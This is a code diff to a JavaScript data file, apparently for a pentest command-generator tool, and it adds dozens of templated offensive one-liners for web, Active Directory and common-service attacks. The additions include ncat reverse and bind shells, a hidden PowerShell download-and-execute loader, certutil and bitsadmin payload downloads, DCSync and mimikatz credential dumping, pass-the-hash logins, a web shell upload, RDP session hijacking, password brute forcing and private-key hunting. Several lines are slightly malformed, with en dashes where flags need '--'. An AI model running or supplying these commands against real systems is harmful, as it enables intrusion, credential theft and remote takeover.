@@ -602,18 +602,148 @@ const webCommands = withCommandType(
     CommandType.WEB,
     [
         {
-            "name": "Nmap Web Ports",
-            "command": "nmap -sC -sV -p 80,443 {ip}",
-            "meta": ["linux", "mac"]
-        },
-        {
             "name": "Gobuster Directory Bruteforce",
             "command": "gobuster dir -u http://{ip}:{port}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
             "meta": ["linux", "mac"]
         },
         {
-            "name": "WhatWeb Fingerprint",
+            "name": "WhatWeb",
             "command": "whatweb http://{ip}:{port}/",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "nikto",
+            "command": "nikto -h http://{ip}",
+            "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "ds store exploit",
+            "command": "wget https://github.com/lijiejie/ds_store_exp/raw/refs/heads/master/ds_store_exp.py && pip install ds-store requests && python ds_store_exp.py http://{ip}/.DS_Store",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "feroxbuster directory scan",
+            "command": "feroxbuster -u http://{fqdn} -C 404 -C 500",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "dirsearch web scan",
+            "command": "sudo dirsearch --url=http://{fqdn} --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "gobuster directory advanced",
+            "command": "sudo gobuster dir -u https://{fqdn}/dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php -k",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "ffuf subdomain enum",
+            "command": "ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://{domain} -H \"Host: FUZZ.{domain}\" -fs",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "ffuf directory fuzz",
+            "command": "ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://{ip}:{port}/FUZZ",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "ffuf extension fuzz",
+            "command": "ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://{ip}:{port}/blog/indexFUZZ",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "ffuf recursive scan",
+            "command": "ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://{ip}:{port}/FUZZ -recursion -recursion-depth 1 -e .php -v",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "ffuf vhost discovery",
+            "command": "ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://{ip}:{port}/ -H 'Host: FUZZ.{domain}'",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "ffuf get parameters",
+            "command": "ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://{fqdn}:{port}/admin/admin.php?FUZZ=key -fs xxx",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "ffuf post parameters",
+            "command": "ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://{fqdn}:{port}/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "curl post request",
+            "command": "curl http://{fqdn}:{port}/admin/admin.php -X POST -d 'id={id}' -H 'Content-Type: application/x-www-form-urlencoded'",
+            "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "gobuster vhost scan",
+            "command": "gobuster vhost -u http://{ip} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "recon spider",
+            "command": "python3 ReconSpider.py http://{fqdn}",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "xsstrike scanner",
+            "command": "python3 -m venv venv\nsource venv/bin/activate\npython xsstrike.py -u \"http://{fqdn}/login?msg=\"",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "xsstrike post scan",
+            "command": "python xsstrike.py -u \"http://{fqdn}/dashboard\" --data \"title=test&description=test\" --headers \"Cookie: session={cookie}\"",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "sql injection test",
+            "command": "curl \"http://{fqdn}/{path}?id='\"",
+            "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "eyewitness screenshot",
+            "command": "eyewitness --web -x web_discovery.xml -d {outdir}",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "aquatone screenshot",
+            "command": "cat web_discovery.xml | ./aquatone -nmap",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "certificate transparency",
+            "command": "curl -s \"https://crt.sh/?q={domain}&output=json\" | jq -r '.[] | select(.name_value | contains(\"dev\")) | .name_value' | sort -u",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "waf detection",
+            "command": "wafw00f {fqdn}",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "http server header",
+            "command": "curl -I http://{ip} | grep Server:",
+            "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "iis shortname scan",
+            "command": "nmap -p80 --script http-iis-short-name-brute {ip}",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "aspx shell upload",
+            "command": "curl -T shell.aspx http://{ip}/shell.aspx",
+            "meta": ["linux", "mac"]
+        },
+        {
+            "name": "burp proxy chrome",
+            "command": "chromium --user-data-dir=/tmp/burp --proxy-server=\"http://127.0.0.1:8080\"",
+            "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "burp suite launch",
+            "command": "JAVA_CMD=$(readlink -f /usr/lib/jvm/java-21-openjdk-$(uname -m)/bin/java) && JAVA_CMD=$JAVA_CMD burpsuite",
             "meta": ["linux", "mac"]
         }
     ]
@@ -621,44 +751,724 @@ const webCommands = withCommandType(
 
 const activeDirectoryCommands = withCommandType(
     CommandType.ActiveDirectory,
-    [
-        {
-            "name": "bloodhound-python Collection",
-            "command": "bloodhound-python -d example.com -u USER -p PASS -ns {ip} --zip",
-            "meta": ["linux", "mac"]
-        },
-        {
-            "name": "GetADUsers Enumeration",
-            "command": "GetADUsers.py domain/user:password@{ip} -all",
-            "meta": ["linux", "mac"]
-        },
-        {
-            "name": "CrackMapExec SMB Sweep",
-            "command": "crackmapexec smb {ip} -u USER -p PASS --shares",
-            "meta": ["linux", "mac", "windows"]
-        }
-    ]
+[
+{
+"name": "winrm pth",
+"command": "evil-winrm -i {ip} -u {user} -H {nthash}",
+"meta": ["linux","mac"]
+},
+{
+"name": "rdp brute",
+"command": "hydra -t 4 -V -f -L users.txt -P passwords.txt rdp://{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "smbclient list",
+"command": "smbclient -L \\{ip} -U '{user}%{password}'",
+"meta": ["linux","mac"]
+},
+{
+"name": "smbclient get",
+"command": "smbclient \\{ip}\{share} -U '{user}%{password}' -c 'get {remote} {local}'",
+"meta": ["linux","mac"]
+},
+{
+"name": "smbclient put",
+"command": "smbclient \\{ip}\{share} -U '{user}%{password}' -c 'put {local} {remote}'",
+"meta": ["linux","mac"]
+},
+{
+"name": "smbclient auth null",
+"command": "smbclient -N \\{ip}\IPC$ -c 'srvinfo'",
+"meta": ["linux","mac"]
+},
+{
+"name": "smbmap enum",
+"command": "smbmap -H {ip} -u {user} -p '{password}' -d {domain}",
+"meta": ["linux","mac"]
+},
+{
+"name": "smbmap upload",
+"command": "smbmap -H {ip} -u {user} -p '{password}' -d {domain} -R '{share}' –upload '{local}:{remote}'",
+"meta": ["linux","mac"]
+},
+{
+"name": "winrm exec",
+"command": "winrm -hostname:{ip} -username:{user} -password:'{password}' -command 'whoami /all'",
+"meta": ["linux","mac","windows"]
+},
+{
+"name": "wmic service",
+"command": "wmic /node:{ip} /user:{domain}\{user} /password:{password} service list brief",
+"meta": ["windows"]
+},
+{
+"name": "sc query",
+"command": "sc \{ip} query",
+"meta": ["windows"]
+},
+{
+"name": "schtasks query",
+"command": "schtasks /Query /S {ip} /U {domain}\{user} /P {password}",
+"meta": ["windows"]
+},
+{
+"name": "create scheduled gpo",
+"command": "powershell -Command \"New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) | Register-ScheduledTask -TaskName '{task}' -Action (New-ScheduledTaskAction -Execute '{cmd}') -Force\"",
+"meta": ["windows"]
+},
+{
+"name": "at create",
+"command": "at \\{ip} 23:59 /interactive cmd.exe",
+"meta": ["windows"]
+},
+{
+"name": "net user create",
+"command": "net user {user} '{password}' /add /domain",
+"meta": ["windows"]
+},
+{
+"name": "net localgroup add",
+"command": "net localgroup Administrators {user} /add",
+"meta": ["windows"]
+},
+{
+"name": "net share list",
+"command": "net share \\{ip}",
+"meta": ["windows"]
+},
+{
+"name": "icacls export",
+"command": "icacls \"{path}\" /save {outfile} /t",
+"meta": ["windows"]
+},
+{
+"name": "icacls grant",
+"command": "icacls \"{path}\" /grant {user}:(F) /t",
+"meta": ["windows"]
+},
+{
+"name": "whoami privs",
+"command": "whoami /priv",
+"meta": ["windows"]
+},
+{
+"name": "getsecrets",
+"command": "secretsdump.py {domain}/{user}:{password}@{ip} -outputfile {outfile}",
+"meta": ["linux","mac"]
+},
+{
+"name": "dcsync impacket",
+"command": "secretsdump.py -just-dc -outputfile dcsync {domain}/{user}:{password}@{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "dcsync mimikatz",
+"command": "powershell -Command \"& .\mimikatz.exe 'privilege::debug' 'lsadump::dcsync /domain:{fqdn} /user:krbtgt' exit\"",
+"meta": ["windows"]
+},
+{
+"name": "invoke-mimikatz lsadump",
+"command": "powershell -Command \"Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command 'lsadump'\"",
+"meta": ["windows"]
+},
+{
+"name": "get-laps",
+"command": "powershell -Command \"Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | select Name,ms-Mcs-AdmPwd\"",
+"meta": ["windows"]
+},
+{
+"name": "get-applocker",
+"command": "powershell -Command \"Get-AppLockerPolicy -Effective | ConvertTo-Json\"",
+"meta": ["windows"]
+},
+{
+"name": "powershell download",
+"command": "powershell -Command \"Invoke-WebRequest -Uri 'http://{ip}:{port}/{file}' -OutFile '{outfile}'\"",
+"meta": ["windows","linux","mac"]
+},
+{
+"name": "certutil download",
+"command": "certutil -urlcache -split -f http://{ip}:{port}/{file} {outfile}",
+"meta": ["windows"]
+},
+{
+"name": "bitsadmin download",
+"command": "bitsadmin /transfer myJob /download /priority normal http://{ip}:{port}/{file} {outfile}",
+"meta": ["windows"]
+},
+{
+"name": "wmic process create",
+"command": "wmic /node:{ip} process call create 'cmd.exe /c {cmd}'",
+"meta": ["windows"]
+},
+{
+"name": "psexec smbexec",
+"command": "psexec.py {domain}/{user}:'{password}'@{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "smbexec impacket",
+"command": "smbexec.py {domain}/{user}:{password}@{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "atp harvest",
+"command": "powershell -Command \"Get-EventLog -LogName Security -Newest 200 | Where-Object {$_.EventID -in @(4624,4625)}\"",
+"meta": ["windows"]
+},
+{
+"name": "seatbelt run",
+"command": "Seatbelt.exe -outputfile {outfile}",
+"meta": ["windows"]
+},
+{
+"name": "winlogbeat export",
+"command": "powershell -Command \"Get-WinEvent -LogName Security -MaxEvents 1000 | Export-Clixml {outfile}\"",
+"meta": ["windows"]
+},
+{
+"name": "powershell iu",
+"command": "powershell -Command \"Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\"",
+"meta": ["windows"]
+},
+{
+"name": "reg query runkeys",
+"command": "reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
+"meta": ["windows"]
+},
+{
+"name": "query user sessions",
+"command": "query user /server:{ip}",
+"meta": ["windows"]
+},
+{
+"name": "qwinsta sessions",
+"command": "qwinsta /server:{ip}",
+"meta": ["windows"]
+},
+{
+"name": "get-localadmin",
+"command": "powershell -Command \"Get-LocalGroupMember -Group 'Administrators' | Select-Object Name\"",
+"meta": ["windows"]
+},
+{
+"name": "migrate meterpreter",
+"command": "sessions -i {id}\nmigrate {pid}",
+"meta": ["linux","mac","windows"]
+},
+{
+"name": "powershell reflective",
+"command": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/{script}')\"",
+"meta": ["windows"]
+},
+{
+"name": "ncat bind",
+"command": "ncat -lvp {port} -e /bin/bash",
+"meta": ["linux","mac"]
+},
+{
+"name": "ncat reverse",
+"command": "ncat {ip} {port} -e /bin/bash",
+"meta": ["linux","mac"]
+},
+{
+"name": "ssh pwn",
+"command": "ssh {user}@{ip} -p {port}",
+"meta": ["linux","mac","windows"]
+},
+{
+"name": "getsshkeys",
+"command": "cat /home/{user}/.ssh/authorized_keys",
+"meta": ["linux","mac"]
+},
+{
+"name": "ssh-copy",
+"command": "ssh-copy-id -i ~/.ssh/id_rsa.pub {user}@{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "sudo list",
+"command": "sudo -l -U {user}",
+"meta": ["linux","mac"]
+},
+{
+"name": "linux passwd",
+"command": "passwd –status {user}",
+"meta": ["linux","mac"]
+},
+{
+"name": "crontab list",
+"command": "crontab -l -u {user}",
+"meta": ["linux","mac"]
+},
+{
+"name": "systemctl list",
+"command": "systemctl list-units –type=service –state=running",
+"meta": ["linux","mac"]
+},
+{
+"name": "journalctl recent",
+"command": "journalctl -n 200",
+"meta": ["linux","mac"]
+},
+{
+"name": "docker ps",
+"command": "docker ps -a –format '{{.ID}} {{.Image}} {{.Names}}'",
+"meta": ["linux","mac"]
+},
+{
+"name": "docker exec",
+"command": "docker exec -it {container} /bin/sh",
+"meta": ["linux","mac"]
+},
+{
+"name": "ssh knownhosts",
+"command": "ssh-keyscan -H {fqdn} >> ~/.ssh/known_hosts",
+"meta": ["linux","mac"]
+},
+{
+"name": "resolver enum",
+"command": "dig +short {fqdn} @{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "dns zone transfer",
+"command": "dig AXFR {domain} @{ip}",
+"meta": ["linux","mac"]
+},
+{
+"name": "enum dns records",
+"command": "dnsrecon -d {domain} -n {ip}",
+"meta": ["linux","mac"]
+}
+]
 );
 
 const commonServiceCommands = withCommandType(
     CommandType.CommonService,
-    [
-        {
-            "name": "Nmap Default Scripts",
-            "command": "nmap -sC -sV -Pn {ip}",
-            "meta": ["linux", "mac"]
-        },
-        {
-            "name": "Netcat Banner Grab",
-            "command": "nc -nv {ip} {port}",
-            "meta": ["linux", "mac", "windows"]
-        },
-        {
-            "name": "Enum4linux-ng Audit",
-            "command": "enum4linux-ng -A {ip}",
-            "meta": ["linux", "mac"]
-        }
-    ]
+[
+  {
+    "name": "python venv",
+    "command": "python3 -m venv venv && source venv/bin/activate",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap ping",
+    "command": "nmap -sn {cidr}",
+    "meta": ["linux", "mac", "windows"]
+  },
+  {
+    "name": "fping range",
+    "command": "fping -asgq {cidr}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ping once",
+    "command": "ping -c 1 {ip}",
+    "meta": ["linux", "mac", "windows"]
+  },
+  {
+    "name": "nmap tcp full",
+    "command": "sudo nmap -v -sCV -T4 -p0-65535 -Pn {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap udp full",
+    "command": "sudo nmap -sU -T4 -p0-65535 -Pn {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap quick ports",
+    "command": "sudo nmap -p0-65535 -T4 -Pn -v --open {ip} -oG open ports.txt\nports=$(grep \"Ports:\" open ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\\n' | awk -F'/' '{print $1}' | tr '\\n' ',' | sed 's/,$//')\nsudo nmap -sCV -A -Pn -p\"$ports\" -vv {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap udp port",
+    "command": "sudo nmap {ip} -p{port} -sU -Pn -n --disable-arp-ping --packet-trace",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap ack",
+    "command": "sudo nmap {ip} -p{port} -sA -Pn -n --disable-arp-ping --packet-trace",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap decoy",
+    "command": "sudo nmap {ip} -p- -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap source ip",
+    "command": "sudo nmap {ip} -n -Pn -p {port} -O -S {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap dns source port",
+    "command": "sudo nmap {ip} -p{port} -sS -Pn -n -sV --disable-arp-ping --packet-trace --source-port 53",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap evasion udp",
+    "command": "sudo nmap {ip} -sU -Pn -n -vvv -A --disable-arp-ping --packet-trace -D RND:5 --source-port 53 -oA scan output -T2 -F",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap evasion tcp",
+    "command": "sudo nmap {ip} -sA -Pn -sCV -vvv --n --disable-arp-ping --packet-trace -D RND:5 --source-port 53 -oA scan output -T2 -F",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ncat source port",
+    "command": "ncat -nv --source-port 53 {ip} {port}",
+    "meta": ["linux", "mac", "windows"]
+  },
+  {
+    "name": "nmap ssh audit",
+    "command": "git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit && ./ssh-audit.py {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ssh pw auth",
+    "command": "ssh -v {user}@{ip} -o PreferredAuthentications=password",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "rsync list",
+    "command": "nc -nv {ip} 873\nrsync -av --list-only rsync://127.0.0.1/dev",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "rsync get all",
+    "command": "rsync -av rsync://{ip}/dev",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "rlogin",
+    "command": "rlogin {ip} -l {username}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "rwho rusers",
+    "command": "rwho\nrusers -al {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "rdp xfreerdp",
+    "command": "xfreerdp /u:{user} /p:\"{password}\" /v:{ip} /cert:ignore",
+    "meta": ["linux", "mac", "windows"]
+  },
+  {
+    "name": "rdp nla disable",
+    "command": "xfreerdp /u: /p: /v:{ip} /cert:ignore /sec:rdp +sec-nla",
+    "meta": ["linux", "mac", "windows"]
+  },
+  {
+    "name": "rdp sec check",
+    "command": "git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check && ./rdp-sec-check.pl {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "rdp session hijack",
+    "command": "sc.exe create sessionhijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#13\" && net start sessionhijack",
+    "meta": ["windows"]
+  },
+  {
+    "name": "evil winrm",
+    "command": "evil-winrm -i {ip} -u {user} -p \"{password}\"",
+    "meta": ["linux", "mac", "windows"]
+  },
+  {
+    "name": "wmiexec example",
+    "command": "python3 /usr/share/doc/python3-impacket/examples/wmiexec.py {user}:\"{password}\"@{ip} \"hostname\"",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ftp anonymous",
+    "command": "ftp -p {ip}",
+    "meta": ["linux", "mac", "windows"]
+  },
+  {
+    "name": "nmap ftp scripts",
+    "command": "sudo nmap -sCV -A -Pn -p21 -vv {ip} --script \"/usr/share/nmap/scripts/ftp*.nse\"",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "openssl ftp starttls",
+    "command": "openssl s_client -connect {ip}:21 -starttls ftp",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "hydra ftp",
+    "command": "hydra -L users.list -P passwords.list ftp://{ip}:{port} -t 64",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap smb os",
+    "command": "nmap --script smb-os-discovery.nse -p445 {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap smb vuln",
+    "command": "nmap --script=smb-vuln* -p139,445 {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "rpcclient null",
+    "command": "rpcclient -U \"\" -N {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "showmount",
+    "command": "showmount -e {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "mount nfs sudo",
+    "command": "mkdir target-NFS && sudo mount -t nfs {ip}:/ ./target-NFS/ -o nolock\nsudo chown -R $USER:$USER target-NFS && sudo chmod -R 755 target-NFS",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "dig basic",
+    "command": "dig A {domain}\ndig NS {domain}",
+    "meta": ["linux", "mac", "windows"]
+  },
+  {
+    "name": "dig axfr",
+    "command": "dig AXFR {domain} @{ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "dnsenum",
+    "command": "dnsenum --dnsserver {ip} --enum -f wordlist.txt {domain}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap smtp banner",
+    "command": "sudo nmap {ip} -sC -sV -p25",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "nmap smtp open relay",
+    "command": "sudo nmap {ip} -p25 --script smtp-open-relay",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "swaks send",
+    "command": "swaks --from a@b --to c@d --server {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "openssl imaps",
+    "command": "openssl s_client -connect {ip}:imaps",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "hydra imap",
+    "command": "hydra -L users.txt -P passwords.txt imap://{ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "o365spray validate",
+    "command": "python3 o365spray.py --validate --domain {domain}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "snmpwalk",
+    "command": "snmpwalk -v2c -c public {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "onesixtyone",
+    "command": "onesixtyone -c wordlist.txt {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "braa oid",
+    "command": "braa public@{ip}:.1.3.6.*",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "mysql connect",
+    "command": "mysql -u root -pP4SSw0rd -h {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "mssql nmap",
+    "command": "sudo nmap -p1433 --script ms-sql-* {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "impacket mssql",
+    "command": "impacket-mssqlclient Administrator@{ip} -windows-auth",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "odat sid bruteforce",
+    "command": "./odat.py all -s {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "sqlplus connect",
+    "command": "sqlplus scott/tiger@{ip}/XE",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ipmi version",
+    "command": "sudo nmap -sU -p623 --script ipmi-version {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ipmitool chassis",
+    "command": "ipmitool -I lanplus -H {ip} -U {user} -P {password} chassis power status",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ldap anonymous",
+    "command": "ldapsearch -x -H ldap://{ip} -s base",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ldapdomaindump",
+    "command": "ldapdomaindump ldap://{ip} --no-json -d {domain}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "kerbrute userenum",
+    "command": "kerbrute userenum --dc {ip} -d {domain} users.txt",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "getuserspns",
+    "command": "GetUserSPNs.py {domain}/{user}:{password}@{ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "asrep roast",
+    "command": "GetNPUsers.py {domain}/ -no-pass -usersfile users.txt -dc-ip {ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "steghide embed",
+    "command": "steghide embed -cf cvr.jpg -ef emb.txt",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "steghide extract",
+    "command": "steghide extract -sf stg.jpg",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "stegcracker info",
+    "command": "stegcracker HackerAccessGranted.jpg /path/to/wordlist.txt",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "strings exiftool",
+    "command": "strings HackerAccessGranted.jpg\nexiftool HackerAccessGranted.jpg",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "zsteg png",
+    "command": "zsteg *.png",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "depix run",
+    "command": "git clone https://github.com/spipm/Depix.git && cd Depix && python3 depix.py -p {pathtoimage}/image.png -s",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "steghide info try",
+    "command": "sudo steghide info *.jpg\nsudo steghide extract -sf *.jpg",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "searchsploit web",
+    "command": "searchsploit -w {keyword}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "searchsploit mirror",
+    "command": "searchsploit -m {exploit_id}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "hashcat mutate",
+    "command": "hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "john single",
+    "command": "john --format=sha256 hashes_to_crack.txt",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "john wordlist",
+    "command": "john --wordlist={wordlist_file} --rules {hash_file}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "john incremental",
+    "command": "john --incremental {hash file}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "hydra ssh",
+    "command": "hydra -l {user} -P /path/to/password_list.txt ssh://{ip}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "hydra http post",
+    "command": "hydra -L {userlist} -P {passlist} {ip} http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid credentials\"",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "hydra rdp generate",
+    "command": "hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 {ip} rdp",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "medusa ssh",
+    "command": "medusa -M ssh -h {ip} -u {user} -P passwords.txt -t 4",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "creds download",
+    "command": "curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "cewl site",
+    "command": "cewl https://{fqdn} -d 4 -m 6 --lowercase -w {out_wordlist}",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "john office",
+    "command": "office2john.py Protected.docx > protected-docx.hash && john --wordlist=rockyou.txt protected-docx.hash",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "find files encoded",
+    "command": "for ext in $(echo \".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*\"); do echo -e \"\\nFile extension: \" $ext; find / -name *$ext 2>/dev/null | grep -v \"lib\\|fonts\\|share\\|core\"; done",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "grep private key",
+    "command": "grep -rnw \"PRIVATE KEY\" /* 2>/dev/null | grep \":1\"",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "ssh2john convert",
+    "command": "ssh2john.py SSH.private > ssh.hash && john --wordlist=rockyou.txt ssh.hash",
+    "meta": ["linux", "mac"]
+  },
+  {
+    "name": "pdf2john",
+    "command": "pdf2john server_doc.pdf > server_doc.hash && john --wordlist=rockyou.txt server_doc.hash",
+    "meta": ["linux", "mac"]
+  }
+]
 );
 
 const rsgData = {
